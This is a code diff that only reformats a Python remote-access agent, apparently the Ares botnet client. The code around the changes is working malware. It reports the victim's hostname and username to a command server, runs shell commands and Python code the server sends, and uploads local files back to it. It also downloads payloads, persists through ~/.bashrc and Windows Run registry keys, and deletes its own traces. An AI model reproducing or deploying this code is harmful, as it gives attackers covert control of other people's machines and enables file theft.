@@ -16,7 +16,6 @@ import zipfile
 import tempfile
 import socket
 import getpass
-
 if os.name == 'nt':
     from PIL import ImageGrab
 else:
@@ -30,11 +29,11 @@ def threaded(func):
         t = threading.Thread(target=func, args=_args)
         t.start()
         return
-
     return wrapper
 
 
 class Agent(object):
+
     def __init__(self):
         self.idle = True
         self.silent = False
@@ -93,7 +92,7 @@ class Agent(object):
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-                            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+        json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -106,7 +105,7 @@ class Agent(object):
         if newlines:
             output += "\n\n"
         req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
-                            data={'output': output})
+        data={'output': output})
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -116,8 +115,7 @@ class Agent(object):
     def runcmd(self, cmd):
         """ Runs a shell command and returns its output """
         try:
-            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE)
+            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
             output = (out + err)
             self.send_output(output)
@@ -138,13 +136,13 @@ class Agent(object):
             with open(command_or_file, 'r') as f:
                 python_code = f.read()
                 try:
-                    exec (python_code)
+                    exec(python_code)
                 except Exception as exc:
                     self.send_output(traceback.format_exc())
         else:
             self.send_output("[*] Running python command...")
             try:
-                exec (command_or_file)
+                exec(command_or_file)
             except Exception as exc:
                 self.send_output(traceback.format_exc())
         sys.stdout = old_stdout
@@ -163,7 +161,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
-                              files={'uploaded': open(file, 'rb')})
+                files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
         except Exception as exc:
@@ -173,7 +171,7 @@ class Agent(object):
     def download(self, file, destination=''):
         """ Downloads a file the the agent host through HTTP(S) """
         try:
-            destination = self.expand_path(destination)
+            destination= self.expand_path(destination)
             if not destination:
                 destination = file.split('/')[-1]
             self.send_output("[*] Downloading %s..." % file)
@@ -207,8 +205,7 @@ class Agent(object):
                     f.write(desktop_entry)
             else:
                 with open(self.expand_path("~/.bashrc"), "a") as f:
-                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(
-                        sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
@@ -259,8 +256,7 @@ class Agent(object):
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
             subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (
-            persist_dir, persist_dir)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
         elif platform.system() == 'Darwin':
             persist_dir = self.expand_path('~/.ares')
@@ -347,7 +343,7 @@ class Agent(object):
                             if not args:
                                 self.send_output('usage: upload <localfile>')
                             else:
-                                self.upload(args[0], )
+                                self.upload(args[0],)
                         elif command == 'download':
                             if not args:
                                 self.send_output('usage: download <remote_url> <destination>')
@@ -400,11 +396,9 @@ class Agent(object):
                     self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
-
 def main():
     agent = Agent()
     agent.run()
-
 
 if __name__ == "__main__":
     main()
